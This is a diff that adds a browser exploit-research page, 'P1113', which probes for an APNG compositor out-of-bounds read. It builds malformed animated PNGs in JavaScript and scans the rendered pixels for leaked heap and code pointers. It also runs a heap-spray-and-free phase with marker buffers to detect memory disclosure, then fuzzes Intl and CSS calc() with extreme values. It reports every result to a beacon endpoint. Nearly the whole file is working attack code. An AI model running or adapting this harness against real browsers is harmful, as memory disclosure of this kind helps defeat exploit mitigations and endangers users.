@@ -1,0 +1,363 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1113</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}.warn{color:#ff6}</style>
+</head><body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight;}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+
+B('P1113-BOOT','');
+log('phase','=== P1113: APNG COMPOSITOR OVERREAD (pastawithpesto technique) ===');
+log('info','Small sub-frame within large canvas — compositor may read past buffer');
+
+// =============================================
+// PNG binary helpers
+// =============================================
+function crc32(buf){
+  var t=new Int32Array(256);
+  for(var n=0;n<256;n++){var c=n;for(var k=0;k<8;k++)c=c&1?0xEDB88320^(c>>>1):c>>>1;t[n]=c;}
+  var crc=0xFFFFFFFF;
+  for(var i=0;i<buf.length;i++)crc=t[(crc^buf[i])&0xFF]^(crc>>>8);
+  return(crc^0xFFFFFFFF)>>>0;
+}
+function u32be(v){return[(v>>>24)&0xFF,(v>>>16)&0xFF,(v>>>8)&0xFF,v&0xFF];}
+function u16be(v){return[(v>>>8)&0xFF,v&0xFF];}
+
+function chunk(type,data){
+  var tb=[type.charCodeAt(0),type.charCodeAt(1),type.charCodeAt(2),type.charCodeAt(3)];
+  var cb=new Uint8Array(4+data.length);cb.set(tb,0);cb.set(data,4);
+  var c=crc32(cb);
+  var o=u32be(data.length).concat(tb);
+  for(var i=0;i<data.length;i++)o.push(data[i]);
+  return o.concat(u32be(c));
+}
+
+function deflateStored(raw){
+  var out=[];var off=0;
+  while(off<raw.length){
+    var rem=raw.length-off;var blen=Math.min(rem,65535);
+    var last=(off+blen>=raw.length)?1:0;
+    out.push(last);out.push(blen&0xFF,(blen>>>8)&0xFF);
+    out.push((~blen)&0xFF,((~blen)>>>8)&0xFF);
+    for(var i=0;i<blen;i++)out.push(raw[off+i]);
+    off+=blen;
+  }
+  var a=1,b=0;
+  for(var i=0;i<raw.length;i++){a=(a+raw[i])%65521;b=(b+a)%65521;}
+  return [0x78,0x01].concat(out).concat(u32be((b<<16)|a));
+}
+
+function solidScanlines(w,h,r,g,b,a){
+  var raw=[];
+  for(var y=0;y<h;y++){raw.push(0);for(var x=0;x<w;x++)raw.push(r,g,b,a);}
+  return raw;
+}
+
+function makeIHDR(w,h){return chunk('IHDR',u32be(w).concat(u32be(h)).concat([8,6,0,0,0]));}
+function makeACTL(f,p){return chunk('acTL',u32be(f).concat(u32be(p)));}
+function makeFCTL(seq,w,h,xo,yo,dn,dd,disp,blend){
+  return chunk('fcTL',u32be(seq).concat(u32be(w),u32be(h),u32be(xo),u32be(yo),u16be(dn),u16be(dd),[disp,blend]));
+}
+function makeIDAT(zdata){return chunk('IDAT',zdata);}
+function makeFDAT(seq,zdata){return chunk('fdAT',u32be(seq).concat(Array.prototype.slice.call(zdata)));}
+function makeIEND(){return chunk('IEND',[]);}
+var SIG=[0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A];
+
+// =============================================
+// Build APNGs with different overread configurations
+// =============================================
+function buildAPNG(canvasW, canvasH, frameW, frameH, frameXO, frameYO, dispOp, blendOp){
+  // Frame 0: full canvas, all red
+  var f0scan=solidScanlines(canvasW,canvasH,0xFF,0x00,0x00,0xFF);
+  var f0z=deflateStored(f0scan);
+  // Frame 1: small sub-frame, all green
+  var f1scan=solidScanlines(frameW,frameH,0x00,0xFF,0x00,0xFF);
+  var f1z=deflateStored(f1scan);
+
+  var png=[].concat(SIG);
+  png=png.concat(makeIHDR(canvasW,canvasH));
+  png=png.concat(makeACTL(2,0)); // 2 frames, loop forever
+  png=png.concat(makeFCTL(0,canvasW,canvasH,0,0,100,1000,0,0)); // frame0: full, dispose=none, blend=source
+  png=png.concat(makeIDAT(f0z));
+  png=png.concat(makeFCTL(1,frameW,frameH,frameXO,frameYO,100,1000,dispOp,blendOp)); // frame1: sub-frame
+  png=png.concat(makeFDAT(2,f1z));
+  png=png.concat(makeIEND());
+  return new Uint8Array(png);
+}
+
+// Scan canvas pixels for leaked data
+function scanPixels(ctx,w,h,frameW,frameH,frameXO,frameYO,tag){
+  var id=ctx.getImageData(0,0,w,h);
+  var d=id.data;
+  var red=0,green=0,black=0,other=0,otherVals=[];
+  var heapPtrs=0,codePtrs=0;
+
+  // Check each pixel
+  for(var y=0;y<h;y++){
+    for(var x=0;x<w;x++){
+      var i=(y*w+x)*4;
+      var r=d[i],g=d[i+1],b=d[i+2],a=d[i+3];
+      var inFrame=(x>=frameXO&&x<frameXO+frameW&&y>=frameYO&&y<frameYO+frameH);
+
+      if(r===0xFF&&g===0x00&&b===0x00&&a===0xFF){red++;}
+      else if(r===0x00&&g===0xFF&&b===0x00&&a===0xFF){green++;}
+      else if(r===0&&g===0&&b===0&&a===0){black++;}
+      else{
+        other++;
+        if(other<=10) otherVals.push(x+','+y+'='+r+'/'+g+'/'+b+'/'+a);
+      }
+    }
+  }
+
+  // Also scan as uint32 for pointer-shaped values
+  var u32=new Uint32Array(id.data.buffer);
+  var ptrLike=0,ptrSamples=[];
+  for(var i=0;i<u32.length-1;i+=2){
+    var lo=u32[i],hi=u32[i+1]; // Note: pixel RGBA pairs form uint64s
+    if(hi>=0x10&&hi<=0xFF){heapPtrs++;ptrSamples.push('px'+i+'=0x'+hi.toString(16)+lo.toString(16));}
+    if(hi>=0x200&&hi<=0x7FFF){codePtrs++;ptrSamples.push('px'+i+'=0x'+hi.toString(16)+lo.toString(16)+'(CODE!)');}
+  }
+
+  var result='red='+red+'|green='+green+'|black='+black+'|other='+other+'|heap='+heapPtrs+'|code='+codePtrs;
+  if(otherVals.length>0) result+='|vals='+otherVals.join(';');
+  if(ptrSamples.length>0) result+='|ptrs='+ptrSamples.slice(0,5).join(';');
+  B(tag,result);
+
+  if(codePtrs>0){log('win','CODE POINTERS IN PIXELS! '+ptrSamples.join(', '));}
+  else if(heapPtrs>0){log('ptr','Heap-shaped values in pixels: '+heapPtrs);}
+  else if(other>0){log('warn','Unexpected pixels: '+other+' — '+otherVals.slice(0,3).join('; '));}
+  else{log('info','Clean: red='+red+' green='+green+' black='+black);}
+
+  return {red:red,green:green,black:black,other:other,heap:heapPtrs,code:codePtrs};
+}
+
+// =============================================
+// Run test configurations
+// =============================================
+var configs=[
+  // [canvasW, canvasH, frameW, frameH, fXO, fYO, dispose, blend, label]
+  [64,64, 2,2, 0,0, 0,0, 'A-small-none-src'],       // dispose=none, blend=source
+  [64,64, 2,2, 0,0, 0,1, 'B-small-none-over'],       // dispose=none, blend=over
+  [64,64, 2,2, 0,0, 1,0, 'C-small-bg-src'],          // dispose=background, blend=source
+  [64,64, 2,2, 0,0, 1,1, 'D-small-bg-over'],         // dispose=background, blend=over
+  [64,64, 2,2, 0,0, 2,0, 'E-small-prev-src'],        // dispose=previous, blend=source
+  [64,64, 2,2, 0,0, 2,1, 'F-small-prev-over'],       // dispose=previous, blend=over
+  [64,64, 1,1, 0,0, 0,0, 'G-1x1-none-src'],          // tiny 1x1
+  [64,64, 1,64, 0,0, 0,0, 'H-col-none-src'],         // 1-wide column
+  [64,64, 64,1, 0,0, 0,0, 'I-row-none-src'],         // 1-tall row
+  [128,128, 2,2, 0,0, 2,1, 'J-large-prev-over'],     // larger canvas
+  [256,1, 1,1, 0,0, 0,0, 'K-wide-1x1'],              // very wide canvas, tiny frame
+  [64,64, 2,2, 62,62, 0,0, 'L-edge-offset'],         // frame at far corner
+];
+
+var testIdx=0;
+var cvs=document.createElement('canvas');
+var ctx=cvs.getContext('2d');
+
+function runNextTest(){
+  if(testIdx>=configs.length){
+    // Phase M: Heap spray then APNG
+    phaseM();
+    return;
+  }
+
+  var c=configs[testIdx];
+  var cW=c[0],cH=c[1],fW=c[2],fH=c[3],fXO=c[4],fYO=c[5],disp=c[6],blend=c[7],label=c[8];
+  cvs.width=cW;cvs.height=cH;
+
+  log('info','Test '+label+': canvas='+cW+'x'+cH+' frame='+fW+'x'+fH+' @'+fXO+','+fYO+' d='+disp+' b='+blend);
+
+  var apng=buildAPNG(cW,cH,fW,fH,fXO,fYO,disp,blend);
+  var blob=new Blob([apng],{type:'image/png'});
+  var url=URL.createObjectURL(blob);
+
+  var img=new Image();
+  img.onload=function(){
+    ctx.clearRect(0,0,cW,cH);
+    ctx.drawImage(img,0,0);
+    URL.revokeObjectURL(url);
+
+    scanPixels(ctx,cW,cH,fW,fH,fXO,fYO,'P1113-'+label);
+    testIdx++;
+    setTimeout(runNextTest,50);
+  };
+  img.onerror=function(){
+    B('P1113-'+label,'LOAD_FAIL');
+    log('fail','Test '+label+': image failed to load');
+    URL.revokeObjectURL(url);
+    testIdx++;
+    setTimeout(runNextTest,50);
+  };
+  img.src=url;
+}
+
+// =============================================
+// Phase M: Heap spray + APNG (spray first to fill heap with markers)
+// =============================================
+function phaseM(){
+  log('phase','--- PHASE M: Heap spray then APNG overread ---');
+
+  // Spray heap with recognizable marker arrays
+  var markers=[];
+  for(var i=0;i<500;i++){
+    var ab=new ArrayBuffer(256);
+    var v=new Uint32Array(ab);
+    for(var j=0;j<v.length;j++) v[j]=0xCAFE0000+i; // marker pattern
+    markers.push(ab);
+  }
+  // Free half to create holes
+  for(var i=0;i<250;i++) markers[i*2]=null;
+
+  // Force GC
+  for(var i=0;i<10;i++){
+    var tmp=[];for(var j=0;j<1000;j++)tmp.push(new ArrayBuffer(128));
+  }
+
+  // Now create APNG — its decode buffer might land in a freed marker slot
+  var apng=buildAPNG(64,64, 2,2, 0,0, 2,1); // dispose=previous, blend=over
+  cvs.width=64;cvs.height=64;
+  var blob=new Blob([apng],{type:'image/png'});
+  var url=URL.createObjectURL(blob);
+  var img=new Image();
+  img.onload=function(){
+    ctx.clearRect(0,0,64,64);
+    ctx.drawImage(img,0,0);
+    URL.revokeObjectURL(url);
+
+    // Scan for our CAFE markers in pixel data
+    var id=ctx.getImageData(0,0,64,64);
+    var u32=new Uint32Array(id.data.buffer);
+    var cafeHits=0,cafeSamples=[];
+    for(var i=0;i<u32.length;i++){
+      if((u32[i]&0xFFFF0000)===0xCAFE0000){
+        cafeHits++;
+        if(cafeSamples.length<5)cafeSamples.push('px'+i+'=0x'+u32[i].toString(16));
+      }
+    }
+    B('P1113-M-SPRAY','cafeHits='+cafeHits+'|'+cafeSamples.join('|'));
+    if(cafeHits>0)log('win','M: MARKER DATA IN PIXELS! '+cafeHits+' hits — OVERREAD CONFIRMED!');
+    else log('info','M: No markers in pixels (decoder buffer was clean)');
+
+    phaseN();
+  };
+  img.onerror=function(){
+    B('P1113-M-SPRAY','LOAD_FAIL');
+    URL.revokeObjectURL(url);
+    phaseN();
+  };
+  img.src=url;
+}
+
+// =============================================
+// Phase N: Intl API stress + Performance entries
+// =============================================
+function phaseN(){
+  log('phase','--- PHASE N: Intl API + Performance entries ---');
+
+  // Intl stress tests
+  var intlResults=[];
+  var locales=['en','ar-SA','zh-Hans','ja-JP','th','he','hi','ko','am','ka','si','my','lo'];
+  for(var i=0;i<locales.length;i++){
+    try{
+      var fmt=new Intl.NumberFormat(locales[i],{style:'currency',currency:'USD',maximumFractionDigits:20});
+      var s=fmt.format(Number.MAX_SAFE_INTEGER);
+      var hasHex=s.match(/[0-9a-f]{8,}/i);
+      if(hasHex)intlResults.push(locales[i]+'=HEX:'+hasHex[0]);
+    }catch(e){}
+  }
+
+  // Intl with extreme values
+  try{
+    var f2=new Intl.NumberFormat('en',{notation:'engineering',maximumSignificantDigits:21});
+    var s2=f2.format(1.7976931348623157e+308);
+    intlResults.push('eng='+s2.substring(0,30));
+  }catch(e){intlResults.push('eng=ERR');}
+
+  // Intl.DateTimeFormat
+  try{
+    var df=new Intl.DateTimeFormat('en',{dateStyle:'full',timeStyle:'full',timeZone:'UTC'});
+    var ds=df.format(new Date(0));
+    intlResults.push('date='+ds.substring(0,40));
+  }catch(e){}
+
+  // Intl.Segmenter (if available)
+  try{
+    if(typeof Intl.Segmenter!=='undefined'){
+      var seg=new Intl.Segmenter('en',{granularity:'word'});
+      var segs=Array.from(seg.segment('Test string here'));
+      intlResults.push('segmenter=YES|segs='+segs.length);
+    }else{intlResults.push('segmenter=NO');}
+  }catch(e){intlResults.push('segmenter=ERR:'+e.message.substring(0,20));}
+
+  B('P1113-N-INTL',intlResults.join('|'));
+  log('info','N: Intl: '+intlResults.join('; '));
+
+  // Performance entries
+  var perfResults=[];
+  try{
+    var entries=performance.getEntries();
+    perfResults.push('entries='+entries.length);
+    for(var i=0;i<Math.min(entries.length,5);i++){
+      var e=entries[i];
+      perfResults.push(e.entryType+':'+e.name.substring(0,30)+'|dur='+e.duration);
+    }
+  }catch(e){perfResults.push('ERR:'+e.message);}
+
+  // PerformanceObserver
+  try{
+    if(typeof PerformanceObserver!=='undefined'){
+      perfResults.push('observer=YES');
+      var types=PerformanceObserver.supportedEntryTypes;
+      if(types)perfResults.push('types='+types.join(','));
+    }
+  }catch(e){}
+
+  B('P1113-N-PERF',perfResults.join('|'));
+  log('info','N: Perf: '+perfResults.join('; '));
+
+  // Phase O: CSS calc() extreme values
+  phaseO();
+}
+
+function phaseO(){
+  log('phase','--- PHASE O: CSS calc() extremes ---');
+
+  var calcResults=[];
+  var calcTests=[
+    'calc(999999999999999999px)',
+    'calc(1px / 0)',
+    'calc(1px * 999999999999)',
+    'calc(1e308px)',
+    'calc(-1e308px)',
+    'calc(1px + 999999999999em)',
+    'calc(NaN * 1px)',
+    'calc(infinity * 1px)',
+  ];
+
+  var el=document.createElement('div');
+  el.style.position='absolute';el.style.visibility='hidden';
+  document.body.appendChild(el);
+
+  for(var i=0;i<calcTests.length;i++){
+    try{
+      el.style.width=calcTests[i];
+      var cs=getComputedStyle(el).width;
+      calcResults.push(calcTests[i].substring(5,25)+'→'+cs);
+    }catch(e){
+      calcResults.push(calcTests[i].substring(5,25)+'→ERR');
+    }
+  }
+  el.remove();
+
+  B('P1113-O-CALC',calcResults.join('|'));
+  log('info','O: calc: '+calcResults.join('; '));
+
+  B('P1113-DONE','tests='+configs.length);
+  log('phase','=== P1113 COMPLETE ===');
+}
+
+// Start tests
+setTimeout(runNextTest,100);
+</script>
+</body></html>
